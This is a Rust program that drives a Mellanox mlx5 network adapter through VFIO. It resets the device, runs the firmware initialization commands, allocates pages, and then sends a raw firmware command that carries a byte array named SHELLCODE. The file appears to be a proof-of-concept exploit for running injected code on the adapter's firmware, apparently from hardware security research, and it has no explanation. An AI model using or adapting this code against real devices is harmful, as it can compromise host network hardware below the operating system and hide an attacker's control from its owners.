#![allow(unused_variables)]

use std::{fmt::Debug, path::PathBuf};

use clap::Parser;
#[allow(unused_imports)]
use dbg_hex::dbg_hex;
use pci_driver::{backends::vfio::VfioPciDevice, device::PciDevice};

use crate::{
    error::Result,
    mlx::Mlx5CmdIf,
    types::{EnableHCA, InitHCA, ManagePages, QueryISSI, QueryPages, SetISSI},
};

pub mod cqe;
pub mod error;
pub mod init;
pub mod mailbox;
pub mod mlx;
pub mod types;

#[derive(Parser, Debug)]
struct CliArgs {
    device: PathBuf,
    input: Vec<u8>,
}

pub const SHELLCODE: &[u8] = &[
    0x18, 0x05, 0x3f, 0x85, 0x1c, 0xa5, 0xc9, 0x36, 0x24, 0xa5, 0xd6, 0x6e, 0x20, 0xa5, 0x74, 0xb9,
    0x18, 0x06, 0x57, 0x10, 0x1c, 0xc6, 0x88, 0x87, 0x24, 0xc6, 0x6c, 0x61, 0x20, 0xc6, 0x14, 0x8e,
    0xfc, 0xa7, 0x30, 0x00, 0x6c, 0x80, 0x28, 0x12, 0x6c, 0x80, 0x30, 0x16, 0x6c, 0x80, 0x38, 0x1a,
    0xfc, 0x00, 0x00, 0x2d,
];

fn main() -> Result<()> {
    env_logger::init();

    let pci_device = VfioPciDevice::open("/sys/bus/pci/devices/0000:04:00.0")?;
    pci_device.reset()?;

    let cmdif = Mlx5CmdIf::new(pci_device)?;
    dbg!(cmdif.do_command(EnableHCA(()))?);
    dbg!(cmdif.do_command(QueryISSI(()))?);

    let out = cmdif.do_command(SetISSI { current_issi: 1 })?;

    let query_boot_pages = cmdif.do_command(QueryPages {
        op_mod: types::QueryPagesOpMod::BootPages,
    })?;
    dbg!(&query_boot_pages);

    let mut available_page = 0x00000000_11000000_u64;
    let mut pages = vec![];
    for _ in 0x00..query_boot_pages.num_pages {
        pages.push(available_page);
        available_page += 0x1000;
    }
    let manage_pages_cmd = ManagePages {
        op_mod: types::ManagePagesOpMod::AllocationSuccess,
        input_num_entries: query_boot_pages.num_pages as u32,
        items: pages,
    };
    cmdif.do_command(manage_pages_cmd)?;

    let query_hca_cap = cmdif.exec_command(
        &[
            0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00,
        ],
        0x1010,
    )?;

    let query_init_pages = cmdif.do_command(QueryPages {
        op_mod: types::QueryPagesOpMod::InitPages,
    })?;

    let mut pages = vec![];
    for _ in 0x00..query_init_pages.num_pages {
        pages.push(available_page);
        available_page += 0x1000;
    }
    let manage_pages_cmd = ManagePages {
        op_mod: types::ManagePagesOpMod::AllocationSuccess,
        input_num_entries: query_init_pages.num_pages as u32,
        items: pages,
    };

    cmdif.do_command(manage_pages_cmd)?;
    cmdif.do_command(InitHCA(()))?;

    let mut msg = vec![
        0x09, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00,
    ];
    msg.extend_from_slice(SHELLCODE);
    msg.resize(0x100, 0u8);
    let output = cmdif.exec_command(&msg, 0x100)?;
    dbg!(output);

    Ok(())
}
